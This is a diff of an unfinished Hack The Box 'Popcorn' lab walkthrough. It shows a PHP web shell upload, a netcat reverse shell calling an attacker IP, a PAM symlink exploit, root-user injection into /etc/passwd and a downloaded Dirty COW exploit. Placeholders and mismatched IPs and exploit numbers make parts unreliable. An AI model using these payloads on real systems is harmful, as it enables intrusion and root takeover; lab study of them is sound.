@@ -7,11 +7,13 @@ tags: ["Hack The Box","OSWE"]
 {% assign imgDir="HTB-Popcorn-Writeup" %}
 
 # Introduction
-The hack the box machine "Popcorn" is a medium machine which is included in [TJnull's OSWE Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979). Exploiting this machine requires knowledge in the areas of 
+The hack the box machine "Popcorn" is a medium machine which is included in [TJnull's OSWE Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979). Acquiring an initial shell as `www-data` on this machine requires knowledge in the areas diretory brute forcing, file upload filter bypassing and PHP web shells. In addition, there is a second approach which requires knowledge of how `.torrent` files are structured. The privilege escalation requires knowledge in the aeras of PAM or Kernel Exploitation.
 
 <img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="BlockyCard">
 
-By enumerating the target, it is possible to discover 
+By enumerating the target, it is possible to discover that port 80 is open. Then, by bruteforcing directories on port 80, one can find `/rename` and `/torrent` which contain a file renaming API and a torrent hosting web site respectively. By navigating to http://10.10.10.6/torrent it is possible to find a login form which allows for sign ups. Once signed up, it is possible to upload torrents to the web server. The first way to achieve remote code execution is to upload a legitimate torrent, navigate to its description, change the image of the torrent to a fake image which contains a reverse shell payload in php, change the extension fo the image from `.png` to `.php` and navigate to the php file to trigger the execution of the script. 
+
+The second approach is to bypass the filter for torrent uploads by uploading a fake torrent which contain a reverse shell payload in php. The fake torrents extension can then be changed with the `rename` api and it is then possible to achieve remote code execution as performed for the first approach. Once an initial shell as `www-data` data has been obtained, the privilege escalation can be performed either through CVE-x or with dirty cow. The next two sections show how to obtain remote code execution using the two approaches. Then, the two subsequent sections show the two ways to perform a privilege escalation from `www-data` to `root`.
 
 # Exploitation
 We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.85`. The `-sS` `-sC` and `-sV` flags instructs nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that port 22 and 80 are open. These ports correspond to SSH and HTTP respectively. 
@@ -57,20 +59,45 @@ Something interesting on the torrent page is the `Sign up` button. If we click t
 
 ![Upload](/assets/{{ imgDir }}/upload.png)
 
-I tried uploading a php reverse shell payload but couldn't evade the filter without changing the content of the uploaded file. There is a [bonus section] at the end of this page which details how to evade the filter and gain remote code execution on the target in a slightly more complicated approach. However, we'll stick to the easier way. It was we can upload a real torrent file . I used a [random torrent](https://kali.download/base-images/kali-2021.3/kali-linux-2021.3a-installer-amd64.iso.torrent) from the [Kali Linux web site](https://www.kali.org/get-kali/).
+I tried uploading a php reverse shell payload but couldn't evade the filter without changing the content of the uploaded file. At this point, there are two ways to get remote code execution. In the next subsection, we'll cover the easier way to do it. After that subsection, there is a subsection detailing how remote code execution can be obtained using the slightly harder approach.
 
-Once uploaded, we can navigate to the torrents page and click "Edit picture". Here, it appears to be possible to upload pictures with any content. We create a file named "webShell.png" with the content below, and upload it.
+## Initial Shell - Uploading a Malicious Image
+If we try to upload a real torrent file, the upload is successful and we are redirected to a page which represents the uploaded torrent. It is possible to find a [legitimate torrent](https://kali.download/base-images/kali-2021.3/kali-linux-2021.3a-installer-amd64.iso.torrent) file to upload on the [Kali Linux website](https://www.kali.org/get-kali/), among other websites. Once a torrent file has been uploaded, we reach the page shown below. Here, we can click the "Edit this torrent" button to bring up a web page where we can upload an image.
 
-The next step is to perform a privilege escalation from `www-data` to `root`. There are two ways to do this. The first way is to abuse a known vulnerability in Linux PAM and the second is through kernel exploitation. The next
-# Privilege Escalation - PAM
+![torrentPagePicture](/assets/{{ imgDir }}/torrentPagePicture.png)
 
-We set up ssh for www-data
+![uploadTorrentImage](/assets/{{ imgDir }}/uploadTorrentImage.png)
 
-https://www.exploit-db.com/exploits/14273
+After sending a couple of different requests, we can conclude that the website appears to be accept images with arbitrary content as long as the extension is valid extension for images (Such as `png`, `jpg` e.t.c). As such, we create a file named "webShell.png" with the content below, and upload it.
 
-# Privilege Escalation - Kernel Exploitation
+{% highlight python linenos %}
+<?php
+$cmd = ($_REQUEST['cmd']);
+system($cmd);
+?>
+{% endhighlight %}
 
-# Bonus - Initial Shell (Hard way)
+![image404](/assets/{{ imgDir }}/image404.png)
+
+Next, we need to find where out malicious image was uploaded. If we hover over the new image with the mouse cursor, it is possible to see that it links to its location on the web server `http://10.10.10.6/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.png`. The next thing we need to do is to change the extension of this file to `.php`. If we visit the URL `http://10.10.10.6/rename/index.php?filename=/x&newfilename=/x` we get the response shown below, which leaks the web root of the web application. 
+
+![webRootLeak](/assets/{{ imgDir }}/webRootLeak.png)
+
+In this response, we see that `/var/www` is the root directory of the web application. As such, the fulle path to the malicious png file should be `/var/www/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.png`. As such, we can visit `http://10.10.10.6/rename/index.php?filename=/var/www/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.png&newfilename=/var/www/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.php` to change its extension to `.php`. Upon visiting the URL, the web server responds with the message `OK!` indicating that it successfully renamed the file. If we navigate to `http://10.10.10.6/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.php?cmd=id`, as shown below, we can see that we do indeed have code execution on the target!
+
+![phprce1](/assets/{{ imgDir }}/phprce1.png)
+
+{% highlight none linenos %}
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f
+{% endhighlight %}
+
+To get a shell on the host, we start a netcat listener by executing `nc -lvnp 443` and then execute the reverse shell payload above by visiting the link `/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.16.3+443+>/tmp/f` (Note that you have to change the IP address in the reverse shell payload to your own IP address for this to work). Upon visiting the link, the listener receives a connection which provides us with a shell on the host, as can be seen below.
+
+![shell1](/assets/{{ imgDir }}/shell1.png)
+
+The next step is to perform a privilege escalation from `www-data` to `root`. There are two ways to do this. The first way is to abuse a known vulnerability in Linux PAM and the second is through kernel exploitation. These two approches are detailed in the two sections after the next subsection. Feel free to skip the next subsection if you rather focus on getting a shell as `root` than to explore the second approach for acheiving remote code execution.
+
+## Initial Shell - Bypassing the Torrent Filter
 The starting point for this section is that we have found the torrent page http://10.10.10.6/torrent and that we have created an account with the username `x` and the password `x` as [described earlier](). The upload page is shown below. This upload page expects a torrent file and won't let a user upload anything without first inspecting the content of the file being uploaded. Torrent files are noramlly bencoded. 
 
 (Explain bencoding)
@@ -182,3 +209,84 @@ Earlier, we discovered an api for renaming files. We can use this api to change 
 
 Upon visiting the URL, we get the message "OK!", suggesting that the renaming operation was successful. Then, we can execute code by visiting 
 `http://10.10.10.6/torrent/torrents/b44b82a4bc6c35f6ad5e9fceefef9509c17fba74.php?cmd=[command]` where `[command]`. At this point, we can get a shell on the host with the netcat reverse shell payload shown earlier. Note the i2e does not go away.
+
+The next step is to perform a privilege escalation from `www-data` to `root`. There are two ways to do this. The first way is to abuse a known vulnerability in Linux PAM and the second is through kernel exploitation, as we'll see in the next two sections.
+
+# Privilege Escalation - Linux PAM
+Linux [Pluggable Authentication Modules](https://en.wikipedia.org/wiki/Linux_PAM) (PAM) is a set of libraries that can be used to configure authenticate users a centralized manner. It makes it possible to separate authentication from source code. Instead, authentication can be configured through config files. PAM can for example be used to authenticate users, check if a user account is valid or enforce the usage of strong passwords.checking the directories on the target host, we can discover the directory .cache in the `george` users home directory. This directory is typically created and used by PAM. 
+
+dpkg -l | grep pam
+
+If we check the PAM version, as performed above, we can see that the host uses PAM version 1.0.0 which is vulnerable to CVE-2010-0832 which has an exploit on [exploitdb](https://www.exploit-db.com/exploits/14273). The content of this exploit is shown below. By reading the exploit, we can see that the only relevant part is line x `ln -sf $1 $HOME/.cache` where the exploit creates a symbolic link from the `.cache` directory to a file we want to change permissions for. We could use the exploit as is or just use this command.
+
+{% highlight bash linenos %}
+if [ $# -eq 0 ]; then
+    echo "Usage: $0 /path/to/file"
+    exit 1
+fi
+
+mkdir $HOME/backup 2> /dev/null
+tmpdir=$(mktemp -d --tmpdir=$HOME/backup/)
+mv $HOME/.cache/ $tmpdir 2> /dev/null
+echo "\n@@@ File before tampering ...\n"
+ls -l $1
+ln -sf $1 $HOME/.cache
+echo "\n@@@ Now log back into your shell (or re-ssh) to make PAM call vulnerable MOTD code :)  File will then be owned by your user.  Try /etc/passwd...\n"
+{% endhighlight %}
+
+rm -r /var/www/.cache
+ln -sf /etc/passwd /var/www/.cache
+ls -l /var/www/.cache
+
+ssh-keygen
+cp /var/www/.ssh/id_rsa.pub /var/www/.ssh/authorized_keys
+cat /var/www/.ssh/id_rsa | base64 -w0
+echo '[base64]' | base64 -d > id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa www-data@10.10.10.6
+
+PAM is initialized when someone logs in with their account. As such, we need to somehow log in as the www-data user to exploit the vulnerabilty. Earlier we saw that SSH is running on port 22. If we set up SSH for the www-data user, we can log in as this user and exploit the vulnerability. To setup SSH for this user, we start by creating the directory `/var/www/.ssh` by executing `mkdir /var/www/.ssh`. Then, we execute `ssh-keygen` to generate an SSH key pair. Then, we change the permissions of the private key by executing chmod 600 /home. Note that we can find the home directory `/var/www` of the `www-data` user by executing `echo $HOME`. 
+
+We set up ssh for www-data
+
+openssl passwd -1 hacked
+
+1  Use the MD5 based BSD password algorithm 1.
+
+$1$CauwiL81$RVCASCR/bjV7Ls3c8fBpP/
+
+echo 'root2:$1$CauwiL81$RVCASCR/bjV7Ls3c8fBpP/:0:0:pwned:/root:/bin/bash' >> /etc/passwd
+
+python -c "import pty; pty.spawn('/bin/bash')"
+
+su root2
+
+# Privilege Escalation - Kernel Exploitation
+By executing the command `uname -r`, it is possible to obtain the Kernel version on Linux-based systems. In this particular case, executing the command results in the output `2.6.31-14-generic-pae`. If we search for kernel exploits for this kernel version using searchsploit, we can find the well-known "Dirty Cow" exploit. 
+
+![searchsploit](/assets/{{ imgDir }}/searchsploit.png)
+
+As can be seen above, there are a couple of available exploits. We will proceed with `40839.c` as this is an exploit which has worked well in the past. We copy this exploit to the current directory and save it with the name "dirty.c". Then, we start a python web server to serve this file to the target host.
+
+![copyKE](/assets/{{ imgDir }}/copyKE.png)
+
+<!--
+searchsploit -p linux/local/40839.c
+cp /usr/share/exploitdb/exploits/linux/local/40838.c dirty.c
+
+python3 -m http.server 80
+
+wget http://10.10.16.3/dirty.c
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty hacked
+-->
+
+![runKE](/assets/{{ imgDir }}/runKE.png)
+
+Next, we download the kernel exploit from our host to the target machine using `wget` as shown above. We then compile the exploit with `gcc` by executing `gcc -pthread dirty.c -o dirty -lcrypt`. This command can be found in the comments of the exploit file's source code. We then exeucute `./dirty hacked`. This creates a new `root` user named `firefart` which has the password `hacked`. We can see this by checking the content of the `/etc/passwd` file, as shown below.
+
+![firefartCreated](/assets/{{ imgDir }}/firefartCreated.png)
+
+![sufirefart](/assets/{{ imgDir }}/sufirefart.png)
+
+We can use the `su` command to switch to this new user. We do, however, first need to upgrade our shell. This can be done with python by executing `python -c "import pty; pty.spawn('/bin/bash')"`. Once we have upgraded our shell, we execute `su firefart` and provide the password "hacked" which we chose earlier. As shown in the picture above, this provides us with `root` privileges on the target!
